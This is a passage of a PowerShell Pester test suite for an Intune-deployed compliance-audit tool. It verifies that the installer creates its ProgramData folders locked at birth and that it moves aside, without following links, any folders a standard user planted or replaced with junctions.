        $eval = Test-CEComplianceRules -DiscoveryOutput '{"CECheckerInstalled":"yes"}' -RulesPath $script:softRules
        ($eval.Rules | Where-Object SettingName -eq 'CECheckerInstalled').State | Should -Be 'TypeError'
        ($eval.Rules | Where-Object SettingName -eq 'CEAuditAgeHours').State | Should -Be 'NotDiscovered'
        (Test-CEComplianceRules -DiscoveryOutput "{`"a`":1,`n`"b`":2}" -RulesPath $script:softRules).Problems | Should -Match 'single line'
    }

    It 'rules files stay within Intune limits and use only supported operators and types' {
        foreach ($f in @($script:strictRules, $script:softRules)) {
            (Get-Item $f).Length | Should -BeLessThan 100KB
            $rules = (Get-Content $f -Raw | ConvertFrom-Json).Rules
            foreach ($r in $rules) {
                @('IsEquals', 'NotEquals', 'GreaterThan', 'GreaterEquals', 'LessThan', 'LessEquals') | Should -Contain $r.Operator
                @('Boolean', 'Int64', 'Double', 'String', 'DateTime', 'Version') | Should -Contain $r.DataType
                @($r.RemediationStrings | Where-Object Language -eq 'en_US').Count | Should -Be 1
            }
        }
    }

    It 'the release notes open with the summary as written, and warn when there is none' {
        $release = Join-Path (Join-Path $script:RepoRoot 'tools') 'New-SignedRelease.ps1'
        . (Get-TestInstallerCode -Path $release -Name @('Get-ReleaseSummary'))
        (Get-Content -LiteralPath $release -Raw) | Should -Match '\$intro = Get-ReleaseSummary -Path \$summaryPath' -Because 'the notes use it'
        $dir = Join-Path $TestDrive 'release-summary'
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        $none = [ordered]@{
            missing = $null
            empty   = ''
            blank   = "  `r`n`r`n`t`r`n"
            comment = "`r`n<!-- Say what this release means.`r`n     A second line. -->`r`n`r`n"
        }
        foreach ($case in $none.Keys) {
            $file = Join-Path $dir "$case.md"
            if ($null -ne $none[$case]) { [IO.File]::WriteAllText($file, $none[$case]) }
            $warned = $null
            $intro = Get-ReleaseSummary -Path $file -WarningVariable warned -WarningAction SilentlyContinue
            $intro.Count | Should -Be 0 -Because "a $case summary is no summary"
            @($warned).Count | Should -Be 1 -Because "a $case summary warns"
        }
        # Paragraphs and lists keep their lines. Only the comment and the blank lines around the text go.
        $file = Join-Path $dir 'written.md'
        [IO.File]::WriteAllText($file, "<!-- What this release means. -->`r`n`r`n**Para one.** First line`r`nsecond line.`r`n`r`n- bullet a`n- bullet b`r`n`r`n")
        $warned = $null
        $intro = Get-ReleaseSummary -Path $file -WarningVariable warned
        @($warned).Count | Should -Be 0
        $intro.Count | Should -Be 5
        $intro -join '|' | Should -BeExactly '**Para one.** First line|second line.||- bullet a|- bullet b'
    }

    It 'the Win32 detection script requires the current module version' {
        $v = (Import-PowerShellDataFile (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1')).ModuleVersion
        (Get-Content (Join-Path $script:intune 'Detect-CEChecker.ps1') -Raw) | Should -Match ([regex]::Escape("[version]'$v'"))
    }

    It 'nothing tells an administrator to set Intune''s script signature check to Yes' {
        # Yes runs a script under AllSigned, which trusts only the exact certificate, and Artifact Signing
        # issues a new certificate every day. It stays No until that has been tested; change this then.
        $roots = @('docs', 'intune', 'tools') | ForEach-Object { Join-Path $script:RepoRoot $_ }
        $files = @(Get-ChildItem -LiteralPath $roots -Recurse -File | Where-Object { $_.Extension -in '.md', '.ps1' }) + @(Get-Item -LiteralPath (Join-Path $script:RepoRoot 'README.md'))
        $says = @(foreach ($f in $files) {
                Select-String -LiteralPath $f.FullName -Pattern 'signature check[^.|]*\bYes\b', 'signature check\W*\|\W*Yes' | ForEach-Object { '{0}:{1}' -f $f.Name, $_.LineNumber }
            })
        $says | Should -BeNullOrEmpty
        $release = Get-Content -LiteralPath (Join-Path (Join-Path $script:RepoRoot 'tools') 'New-SignedRelease.ps1') -Raw
        $release | Should -Match 'Leave \*\*Enforce script signature check\*\* at No' -Because 'the release notes say what to set'
    }

    It 'the install makes the data folder and its subfolders locked at birth, before logging or copying, and never takes an existing one back in place' {
        # %ProgramData% lets standard users create folders, and the SYSTEM audit and Intune trust a
        # status.json and config overrides there, so every folder the tool keeps must be born locked.
        $text = (Get-Content (Join-Path $script:intune 'Install-CEChecker.ps1') -Raw) -replace '\r\n', "`n"
        $firstCopy = $text.IndexOf('Copy-Item')
        $firstCopy | Should -BeGreaterThan 0
        $init = $text.IndexOf("`n    Initialize-CEDataRoot -Path `$dataRoot")
        $init | Should -BeGreaterThan 0
        $init | Should -BeLessThan $text.IndexOf('Start-Transcript')
        $init | Should -BeLessThan $firstCopy
        # The root and every kept subfolder are made with New-CELockedDirectory (locked at birth).
        $text | Should -Match "foreach \(\`$name in @\('logs', 'reports', 'cache', 'packs'\)\) \{ New-CELockedDirectory -Path \(Join-Path \`$dataRoot \`$name\) -DataRoot \`$dataRoot "
        $text | Should -Match "New-CELockedDirectory -Path \(Join-Path \`$dataRoot 'config'\) -DataRoot \`$dataRoot -UsersRead"
        # Locked in the one call that creates it: CreateDirectory with a descriptor on 5.1, FileSystemAclExtensions.Create on 7.
        $text | Should -Match '\[IO\.Directory\]::CreateDirectory\(\$Path, \$security\)'
        $text | Should -Match '\[IO\.FileSystemAclExtensions\]::Create\(\[IO\.DirectoryInfo\]::new\(\$Path\), \$security\)'
        # The in-place take-back is gone: no takeown, no ownership reset, no repair of a user folder in place.
        $text | Should -Not -Match '\$takeown'
        $text | Should -Not -Match 'Reset-CEFolderOwner'
        $text | Should -Not -Match 'Repair-CEDataFolder'
        # The owner is set at birth in the descriptor, never forced afterwards onto a folder that might
        # be a racer's: no post-create ownership step, and nothing re-ACLs a data folder in place.
        $text | Should -Not -Match 'Set-CEOwnerAdministrators'
        $text | Should -Not -Match 'SetOwner'
        $text | Should -Not -Match 'Set-Acl'
        $text | Should -Match 'O:BAD:P\(A;OICI;FA;;;SY\)\(A;OICI;FA;;;BA\)' -Because 'owner Administrators is in the birth descriptor'
        # Anything already there is moved aside, never reused.
        $text | Should -Match 'Move-CEItemAside -Path \$Path'
        # The root is set up only AFTER the downgrade check and only once the audit mutex is held,
        # so an older package never moves the folder aside and no upgrade runs underneath an audit.
        $downgrade = [regex]::Match($text, 'if \(-not \$AllowDowngrade -and \(Test-CENewerInstalled').Index
        $mutex = $text.IndexOf("New-Object System.Threading.Mutex(`$false, 'Global\EngramicBaselineAudit')")
        $downgrade | Should -BeGreaterThan 0
        $mutex | Should -BeGreaterThan $downgrade
        $init | Should -BeGreaterThan $mutex -Because 'the mutex is taken before the data root is touched'
        # The audit task's working directory is the install folder, not the data folder, so an audit's
        # open working directory never blocks an upgrade from renaming the data root.
        $text | Should -Match '-WorkingDirectory \$InstallPath'
        $text | Should -Not -Match '-WorkingDirectory \$dataRoot'
        # Native tools by full path; icacls still locks Program Files (Set-CELockedAcl).
        $text | Should -Match "(?m)^\`$icacls = Join-Path \`$system32 'icacls\.exe'$"
        $text | Should -Not -Match '&\s*(icacls|takeown)(\.exe)?\b' -Because 'native tools run by full path, not through PATH'
        $text | Should -Match 'if \(\$transcribing\) \{ Stop-Transcript' -Because 'a failure before logging starts must not hide the real error'
    }

    It 'the locked descriptor a data folder is born with grants only SYSTEM and Administrators (and optionally Users read)' {
        # Test A checks this descriptor is what CreateDirectory / FileSystemAclExtensions.Create is
        # given, so the folder is locked in the one call that makes it. The elevated on-disk result
        # (owner and DACL) is checked by 'Locked-at-birth data folders' when the suite runs elevated.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Install-CEChecker.ps1') -Name @('New-CEDataDirectorySecurity'))
        $adminOnly = (New-CEDataDirectorySecurity).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Access)
        $adminOnly | Should -Match '^D:P'                     # protected: no inheritance from %ProgramData%
        $adminOnly | Should -Match '\(A;OICI;FA;;;SY\)'       # SYSTEM full control, inherited by children
        $adminOnly | Should -Match '\(A;OICI;FA;;;BA\)'       # Administrators full control
        $adminOnly | Should -Not -Match ';;;(BU|WD|AU|IU)\)'  # nobody else, not even read
        $withRead = (New-CEDataDirectorySecurity -UsersRead).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Access)
        $withRead | Should -Match '(?i)\(A;OICI;0x1200a9;;;BU\)' -Because 'the config folder lets Users read, never write'
        $withRead | Should -Not -Match '\(A;OICI;FA;;;BU\)'
        # A config file the install deploys is born administrator-owned too: otherwise it takes its creator's
        # default owner, which in an administrator's elevated session on a Windows client is their account,
        # and the SYSTEM audit ignores a config file SYSTEM or Administrators do not own.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Install-CEChecker.ps1') -Name @('New-CEDataFileSecurity'))
        (New-CEDataFileSecurity).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Owner) | Should -Be 'O:BA'
        $fileDacl = (New-CEDataFileSecurity).GetSecurityDescriptorSddlForm([Security.AccessControl.AccessControlSections]::Access)
        $fileDacl | Should -Match '(?i)^D:P\(A;;FA;;;SY\)\(A;;FA;;;BA\)\(A;;0x1200a9;;;BU\)$'
        $copy = [regex]::Match(((Get-Content -LiteralPath (Join-Path $script:intune 'Install-CEChecker.ps1') -Raw) -replace '\r\n', "`n"), '(?ms)^function Copy-CEStagedConfig \{.*?\n\}').Value
        $copy | Should -Match '\[IO\.File\]::Create\(\$tmp, 4096, \[IO\.FileOptions\]::None, \$security\)'
        $copy | Should -Match '\[IO\.FileSystemAclExtensions\]::Create\(\[IO\.FileInfo\]::new\(\$tmp\)'
        $copy | Should -Match '\$security = New-CEDataFileSecurity'
        $copy | Should -Not -Match '\[IO\.File\]::Copy|Copy-Item' -Because 'a copy takes its creator''s owner and the source''s attributes'
    }

    It 'the install disables the audit task before stopping it, and re-enables it afterwards' {
        # Finding 5: Stop-ScheduledTask does not stop a NEW instance starting while the installer waits
        # on the mutex; an old-version audit that starts then takes its working directory in the data root
        # and blocks the rename. Disabling first prevents that; the task is re-registered (enabled) at the
        # end, and re-enabled in the finally if the install fails first.
        $text = (Get-Content -LiteralPath (Join-Path $script:intune 'Install-CEChecker.ps1') -Raw) -replace '\r\n', "`n"
        $disable = $text.IndexOf('Disable-ScheduledTask')
        $stop = $text.IndexOf('Stop-ScheduledTask')
        $disable | Should -BeGreaterThan 0 -Because 'the task is disabled before the installer waits'
        $stop | Should -BeGreaterThan 0
        $disable | Should -BeLessThan $stop -Because 'disabling first stops a new instance starting during the wait'
        $text | Should -Match '\$disabledAudit = \$false' -Because 'it tracks whether it disabled the task'
        $reenable = [regex]::Match($text, '(?ms)^finally \{.*')
        $reenable.Value | Should -Match 'Enable-ScheduledTask' -Because 'the finally re-enables it if it was disabled and not re-registered'
    }

    It 'Move-CEItemAside retries a busy folder with a back-off, then throws a clear reason' {
        # Finding 5: the one-time move-aside fails if any process holds a handle under the data folder
        # (an old audit, an admin with a report open). It must retry with a back-off and, on final
        # failure, say why so the Intune install error is actionable - not a bare sharing violation.
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        $text = (Get-Content -LiteralPath $installer -Raw) -replace '\r\n', "`n"
        $fn = [regex]::Match($text, '(?ms)^function Move-CEItemAside \{.*?\n\}')
        $fn.Success | Should -BeTrue
        $fn.Value | Should -Match 'for \(\$attempt = 0; \$attempt -lt \d+' -Because 'it retries'
        $fn.Value | Should -Match 'Start-Sleep' -Because 'with a back-off between tries'
        $fn.Value | Should -Match 'open under the data folder' -Because 'the final error says why'
        # It still moves a folder aside normally, without following a link inside it.
        . (Get-TestInstallerCode -Path $installer -Name @('Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside'))
        $src = Join-Path $TestDrive 'mv-src'
        $outside = Join-Path $TestDrive 'mv-outside'
        New-Item -ItemType Directory -Force -Path (Join-Path $src 'a'), $outside | Out-Null
        Set-Content -LiteralPath (Join-Path $src 'a\f.txt') -Value 'x'
        Set-Content -LiteralPath (Join-Path $outside 'keep.txt') -Value 'keep'
        $link = Join-Path $src 'to-outside'
        New-Item -ItemType Junction -Path $link -Target $outside | Out-Null
        try {
            $aside = Move-CEItemAside -Path $src -DataRoot $src
            $aside | Should -Match 'mv-src\.untrusted-'
            Test-Path -LiteralPath $src | Should -BeFalse
            Test-Path -LiteralPath (Join-Path $aside 'a\f.txt') | Should -BeTrue -Because 'the item moved with its contents'
            Get-Content -LiteralPath (Join-Path $outside 'keep.txt') | Should -Be 'keep' -Because 'a rename never follows a link inside the item'
        }
        finally {
            $moved = Join-Path $aside 'to-outside'
            foreach ($j in @($link, $moved)) { if ((Test-Path -LiteralPath $j) -and ([IO.File]::GetAttributes($j) -band [IO.FileAttributes]::ReparsePoint)) { [IO.Directory]::Delete($j, $false) } }
        }
    }

    It 'the install verifies a data folder and moves aside, never re-owns, one that is not the locked form' {
        # The create call is a silent no-op when a folder already exists, leaving its descriptor
        # untouched, so a folder a standard user raced in must be moved aside on the strength of the
        # post-create VERIFY - never re-owned or re-ACLed in place, because its creator may hold a
        # handle. This shims the elevated-only bits (a non-admin can't make a folder owned by
        # Administrators) but exercises the real move-aside-and-retry loop.
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'New-CELockedDirectory', 'Get-CERegistryString', 'Initialize-CEDataRoot'))
        # A birth descriptor without an owner (so the create succeeds unelevated) and a stand-in
        # verifier that treats a folder holding 'planted.txt' as a racer's and anything else as locked.
        function New-CEDataDirectorySecurity { param([switch]$UsersRead) $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); return $s }
        function Test-CELockedFolder { param([string]$Path, [switch]$UsersRead) if (Test-CEReparsePoint -Path $Path) { return "$Path is a link" } if (Test-Path -LiteralPath (Join-Path $Path 'planted.txt')) { return "$Path is controlled by a standard user" } return '' }
        # The install never re-owns or re-ACLs a data folder: fail loudly if it tries.
        Mock Set-Acl { throw 'Set-Acl must never run on a data folder' }

        $pd = Join-Path $TestDrive 'pd-verify'
        $root = Join-Path $pd 'EngramicBaseline'
        $victim = Join-Path $TestDrive 'victim-verify'
        New-Item -ItemType Directory -Force -Path $root, (Join-Path $victim 'sub') | Out-Null
        Set-Content -LiteralPath (Join-Path $victim 'keep.txt') -Value 'keep'
        Set-Content -LiteralPath (Join-Path $root 'planted.txt') -Value 'racer'
        Set-Content -LiteralPath (Join-Path $root 'status.json') -Value '{ "autoFailCount": 0 }'
        $links = New-Object System.Collections.ArrayList
        [void]$links.Add((Join-Path $root 'logs'))
        New-Item -ItemType Junction -Path (Join-Path $root 'logs') -Target $victim | Out-Null
        try {
            # 1) A racer's root (no sealed marker) is moved aside whole; a fresh folder takes its place.
            Initialize-CEDataRoot -Path $root -RegPath 'HKLM:\SOFTWARE\EngramicBaselineNoSuchKey' 3>$null
            Test-Path -LiteralPath $root -PathType Container | Should -BeTrue
            Test-Path -LiteralPath (Join-Path $root 'planted.txt') | Should -BeFalse -Because 'the folder is fresh, not the racer''s taken back'
            Test-Path -LiteralPath (Join-Path $root 'status.json') | Should -BeFalse -Because 'a racer''s status.json is not carried over'
            $aside = @(Get-ChildItem -LiteralPath $pd -Directory -Filter 'EngramicBaseline.untrusted-*')
            $aside.Count | Should -Be 1
            [void]$links.Add((Join-Path $aside[0].FullName 'logs'))
            (Get-Content -LiteralPath (Join-Path $aside[0].FullName 'planted.txt')) | Should -Be 'racer' -Because 'the racer''s folder is moved aside intact, never opened'
            Test-CEReparsePoint -Path (Join-Path $aside[0].FullName 'logs') | Should -BeTrue -Because 'a link inside it is neither followed nor removed, only carried along'
            Get-Content -LiteralPath (Join-Path $victim 'keep.txt') | Should -Be 'keep' -Because 'nothing the link points at is touched'
            Should -Invoke Set-Acl -Times 0 -Because 'a folder that might be a racer''s is never re-owned or re-ACLed'

            # 2) A junction left in place of the root is removed as a link, never followed.
            Remove-Item -LiteralPath $root -Recurse -Force
            New-Item -ItemType Junction -Path $root -Target $victim | Out-Null
            [void]$links.Add($root)
            Initialize-CEDataRoot -Path $root -RegPath 'HKLM:\SOFTWARE\EngramicBaselineNoSuchKey' 3>$null
            Test-CEReparsePoint -Path $root | Should -BeFalse -Because 'the link was removed and a real folder made'
            Get-Content -LiteralPath (Join-Path $victim 'keep.txt') | Should -Be 'keep'

            # 3) A subfolder that appears (a no-op create over a racer) is moved aside, then a fresh one
            # made. The quarantine goes OUT of the data folder, beside it, never to a name inside it: a
            # user-owned tree left inside would be walked by a later SYSTEM delete of the data folder.
            $sub = Join-Path $root 'packs'
            New-Item -ItemType Directory -Path $sub -Force | Out-Null
            Set-Content -LiteralPath (Join-Path $sub 'planted.txt') -Value 'x'
            New-CELockedDirectory -Path $sub -DataRoot $root -WarningVariable subNotices 3>$null
            Test-Path -LiteralPath (Join-Path $sub 'planted.txt') | Should -BeFalse -Because 'the racer folder was moved aside, not taken back'
            @(Get-ChildItem -LiteralPath $root -Force -Filter '*.untrusted-*').Count | Should -Be 0 -Because 'nothing is quarantined inside the data folder'
            $subAside = @(Get-ChildItem -LiteralPath $pd -Directory -Filter 'EngramicBaseline.untrusted-*-packs')
            $subAside.Count | Should -Be 1 -Because 'the quarantine is a sibling of the data folder, named for the folder it held'
            $subAside[0].Name | Should -Match '^EngramicBaseline\.untrusted-[0-9a-f]{32}-packs$'
            (Get-Content -LiteralPath (Join-Path $subAside[0].FullName 'planted.txt')) | Should -Be 'x'
            "$subNotices" | Should -Match ([regex]::Escape($subAside[0].FullName)) -Because 'the warning names where it went, for the log and the event log'
            Should -Invoke Set-Acl -Times 0
        }
        finally {
            foreach ($j in $links) { if ((Test-Path -LiteralPath $j) -and (Test-CEReparsePoint -Path $j)) { [IO.Directory]::Delete($j, $false) } }
        }
    }

    It 'Test-CELockedFolder keeps an admin-only folder (even with a benign read ACE) and rejects a user-writable, wrong-owner, deny or link one' {
        # A folder is judged by trust (design rule 1), not by SDDL equality. An admin-owned folder with
        # no non-admin write/DAC/owner right is kept even when an administrator has added a read-only
        # ACE (browsing it, or granting a helpdesk group read) - the old exact-SDDL match wrongly moved
        # that aside and lost config, packs and reports (Finding 4). A folder a standard user made or
        # could write is still rejected. Get-Acl is mocked so owner and rules can be chosen without
        # elevation (a standard user cannot really set an admin owner).
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Test-CELockedFolder'))
        function global:New-CETestFolderAcl {
            param([string]$OwnerSid, [object[]]$Rules = @())
            $o = New-Object psobject
            $o | Add-Member -MemberType ScriptMethod -Name GetOwner -Value ([scriptblock]::Create("param(`$t) [Security.Principal.SecurityIdentifier]::new('$OwnerSid')"))
            $o | Add-Member -MemberType NoteProperty -Name TestRules -Value @($Rules)
            $o | Add-Member -MemberType ScriptMethod -Name GetAccessRules -Value { param($explicit, $inherited, $type) $this.TestRules }
            return $o
        }
        function global:New-CETestFolderRule {
            param([string]$Sid, [Security.AccessControl.FileSystemRights]$Rights, [string]$Type = 'Allow')
            [pscustomobject]@{ IdentityReference = [Security.Principal.SecurityIdentifier]::new($Sid); FileSystemRights = $Rights; AccessControlType = [Security.AccessControl.AccessControlType]$Type }
        }
        try {
            Mock Test-CEReparsePoint { $false }
            $adminOnly = @((New-CETestFolderRule 'S-1-5-18' FullControl), (New-CETestFolderRule 'S-1-5-32-544' FullControl))
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-32-544' -Rules $adminOnly }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -BeNullOrEmpty -Because 'admin-owned, admin-only'
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-18' -Rules $adminOnly }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -BeNullOrEmpty -Because 'SYSTEM owner is accepted'
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-32-544' -Rules ($adminOnly + @(New-CETestFolderRule 'S-1-5-32-545' ReadAndExecute)) }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -BeNullOrEmpty -Because 'a read-only ACE grants no write, DAC or owner right, so it is kept (Finding 4)'
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-32-544' -Rules ($adminOnly + @(New-CETestFolderRule 'S-1-3-0' FullControl)) }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -BeNullOrEmpty -Because 'CREATOR OWNER applies only to new items'
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-21-1-2-3-1001' -Rules $adminOnly }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -Match 'not SYSTEM or Administrators' -Because 'a standard user cannot set an admin owner'
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-32-544' -Rules ($adminOnly + @(New-CETestFolderRule 'S-1-5-21-1-2-3-1001' Modify)) }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -Match 'can be changed by S-1-5-21-1-2-3-1001' -Because 'a non-admin write ACE means a user could hold an add-file/WRITE_DAC handle'
            Mock Get-Acl { New-CETestFolderAcl -OwnerSid 'S-1-5-32-544' -Rules ($adminOnly + @(New-CETestFolderRule 'S-1-5-18' CreateFiles 'Deny')) }.GetNewClosure()
            Test-CELockedFolder -Path 'X:\seal' | Should -Match 'denies S-1-5-18' -Because 'a deny against a trusted SID could freeze a forged file'
            Mock Test-CEReparsePoint { $true }
            Test-CELockedFolder -Path 'X:\seal' | Should -Match 'is a link' -Because 'a link is rejected whatever its ACL'
        }
        finally { Remove-Item -Path 'function:New-CETestFolderAcl', 'function:New-CETestFolderRule' -ErrorAction SilentlyContinue }
    }

    It 'the install keeps a data folder it sealed at birth, preserving config overrides, packs and reports' {
        # An upgrade must not throw away admin config, installed packs or report history. A root this
        # version sealed (marker in HKLM, still the locked form) is kept in place, and every locked
        # subfolder is kept too, so a second install over the first loses nothing and makes no
        # quarantine folder.
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'New-CELockedDirectory', 'Get-CERegistryString', 'Initialize-CEDataRoot'))
        function New-CEDataDirectorySecurity { param([switch]$UsersRead) $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); return $s }
        # Everything the test makes counts as the locked form; the marker is present (a previous install wrote it).
        function Test-CELockedFolder { param([string]$Path, [switch]$UsersRead) if (Test-CEReparsePoint -Path $Path) { return "$Path is a link" } return '' }
        function Get-CERegistryString { param([string]$Path, [string]$Name) if ($Name -eq 'DataRootSealed') { return '0.3.2' } return '' }

        $pd = Join-Path $TestDrive 'pd-keep'
        $root = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path $root | Out-Null
        # First install sets the folders up.
        Initialize-CEDataRoot -Path $root -RegPath 'HKLM:\SOFTWARE\EngramicBaseline' 3>$null
        foreach ($name in @('logs', 'reports', 'cache', 'packs')) { New-CELockedDirectory -Path (Join-Path $root $name) -DataRoot $root 3>$null }
        New-CELockedDirectory -Path (Join-Path $root 'config') -DataRoot $root -UsersRead 3>$null
        # Admin config override, an installed pack and a report land in the sealed folder.
        Set-Content -LiteralPath (Join-Path $root 'config\firmware-catalog.json') -Value '{ "baseUrl": "" }'
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'packs\p') | Out-Null
        Set-Content -LiteralPath (Join-Path $root 'packs\p\pack.json') -Value '{ "id": "p" }'
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'reports\r1') | Out-Null
        Set-Content -LiteralPath (Join-Path $root 'reports\r1\report.html') -Value '<html/>'

        # Second install (upgrade) over the same, sealed root.
        Initialize-CEDataRoot -Path $root -RegPath 'HKLM:\SOFTWARE\EngramicBaseline' 3>$null
        foreach ($name in @('logs', 'reports', 'cache', 'packs')) { New-CELockedDirectory -Path (Join-Path $root $name) -DataRoot $root 3>$null }
        New-CELockedDirectory -Path (Join-Path $root 'config') -DataRoot $root -UsersRead 3>$null

        Get-Content -LiteralPath (Join-Path $root 'config\firmware-catalog.json') | Should -Match 'baseUrl' -Because 'config overrides survive the upgrade'
        Test-Path -LiteralPath (Join-Path $root 'packs\p\pack.json') | Should -BeTrue -Because 'installed packs survive the upgrade'
        Test-Path -LiteralPath (Join-Path $root 'reports\r1\report.html') | Should -BeTrue -Because 'report history survives the upgrade'
        @(Get-ChildItem -LiteralPath $pd -Directory -Filter 'EngramicBaseline.untrusted-*').Count | Should -Be 0 -Because 'a sealed root is kept, not moved aside'
    }

    It 'Get-CEAsidePath always names a sibling of the data folder, never a path inside it' {
        # Rule: a moved-aside item may be a tree a standard user controls, so it must leave the data
        # folder; a quarantine inside it would be walked by a later SYSTEM delete of the data folder.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Install-CEChecker.ps1') -Name @('Assert-CEInDataRoot', 'Get-CEAsidePath'))
        $root = 'C:\ProgramData\EngramicBaseline'
        Get-CEAsidePath -Path $root -DataRoot $root | Should -Match '^C:\\ProgramData\\EngramicBaseline\.untrusted-[0-9a-f]{32}$'
        Get-CEAsidePath -Path "$root\packs" -DataRoot $root | Should -Match '^C:\\ProgramData\\EngramicBaseline\.untrusted-[0-9a-f]{32}-packs$'
        Get-CEAsidePath -Path "$root\config\network.json" -DataRoot "$root\" | Should -Match '^C:\\ProgramData\\EngramicBaseline\.untrusted-[0-9a-f]{32}-config-network\.json$'
        Get-CEAsidePath -Path 'C:\PROGRAMDATA\ENGRAMICBASELINE\Logs' -DataRoot $root | Should -Match '^C:\\ProgramData\\EngramicBaseline\.untrusted-[0-9a-f]{32}-Logs$' -Because 'Windows paths are case-insensitive'
        { Get-CEAsidePath -Path 'C:\ProgramData\EngramicBaselineX\logs' -DataRoot $root } | Should -Throw '*not in the data folder*' -Because 'a look-alike name is not inside the data folder'
        { Get-CEAsidePath -Path 'C:\ProgramData\EngramicBaseline.untrusted-0123' -DataRoot $root } | Should -Throw '*not in the data folder*'
        { Get-CEAsidePath -Path "$root\..\Other" -DataRoot $root } | Should -Throw '*not in the data folder*' -Because '.. would climb out of the data folder while the start still matched'
        { Get-CEAsidePath -Path "$root\packs\..\..\Other" -DataRoot $root } | Should -Throw '*not in the data folder*'
        { Get-CEAsidePath -Path "$root\.\packs" -DataRoot $root } | Should -Throw '*not in the data folder*' -Because 'nothing in the install builds a . or .. name, so one is refused, not resolved'
        { Get-CEAsidePath -Path 'C:\ProgramData\Other' -DataRoot 'C:\ProgramData\EngramicBaseline\..\Other' } | Should -Throw '*not in the data folder*'
    }

    It 'the install makes nothing locked, and moves nothing aside, outside the data folder' {
        # New-CELockedDirectory is only ever given the data folder and folders in it; a path anywhere else
        # is refused before anything is created, judged, or moved.
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'New-CELockedDirectory'))
        function New-CEDataDirectorySecurity { param([switch]$UsersRead) $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); return $s }
        # Every folder looks a standard user's, so one judged would be moved aside.
        function Test-CELockedFolder { param([string]$Path) return "$Path is owned by S-1-5-21-1-2-3-1001" }
        $pd = Join-Path $TestDrive 'pd-install-scope'
        $root = Join-Path $pd 'EngramicBaseline'
        $beside = Join-Path $pd 'EngramicBaselineX'
        New-Item -ItemType Directory -Force -Path $root, $beside | Out-Null
        Set-Content -LiteralPath (Join-Path $beside 'mine.txt') -Value 'mine'
        foreach ($p in @($beside, "$root\..\EngramicBaselineX", (Join-Path $pd 'new-elsewhere'), $pd)) {
            { New-CELockedDirectory -Path $p -DataRoot $root 3>$null } | Should -Throw '*not in the data folder*' -Because "$p is not in the data folder"
        }
        Get-Content -LiteralPath (Join-Path $beside 'mine.txt') | Should -Be 'mine'
        Test-Path -LiteralPath (Join-Path $pd 'new-elsewhere') | Should -BeFalse -Because 'nothing is created outside the data folder'
        @(Get-ChildItem -LiteralPath $pd -Filter '*.untrusted-*').Count | Should -Be 0
    }

    It 'the install writes every data-folder notice, naming where anything went, to its log and the Application event log' {
        # The move-aside warnings were raised before the install log started, and Intune shows none of an
        # install's console output, so a moved-aside folder (and the config it held) left no record. They
        # are collected with -WarningVariable, written once logging starts and to the event log (ID 1003).
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        $text = (Get-Content -LiteralPath $installer -Raw) -replace '\r\n', "`n"
        $main = $text.Substring($text.IndexOf("`ntry {"))
        $transcript = $main.IndexOf('Start-Transcript -LiteralPath $log')
        $firstNotice = $main.IndexOf('Write-CESetupNotice -Notice $setupNotices')
        $transcript | Should -BeGreaterThan 0
        $firstNotice | Should -BeGreaterThan $transcript -Because 'the notices are written once the log has started'
        $firstNotice | Should -BeLessThan $main.IndexOf('Copy-Item') -Because 'before anything else is done'
        foreach ($call in @('Initialize-CEDataRoot -Path $dataRoot', 'New-CELockedDirectory -Path (Join-Path $dataRoot $name)', "New-CELockedDirectory -Path (Join-Path `$dataRoot 'config')")) {
            $line = @($main -split "`n" | Where-Object { $_.Contains($call) })
            $line.Count | Should -Be 1 -Because $call
            $line[0] | Should -Match '-WarningVariable \+setupNotices' -Because "$call collects its warnings for the log"
        }
        $main.IndexOf('New-Item -Path $sourceKey') | Should -BeLessThan $main.IndexOf('Initialize-CEDataRoot -Path $dataRoot') -Because 'the event source exists before anything can be moved aside'
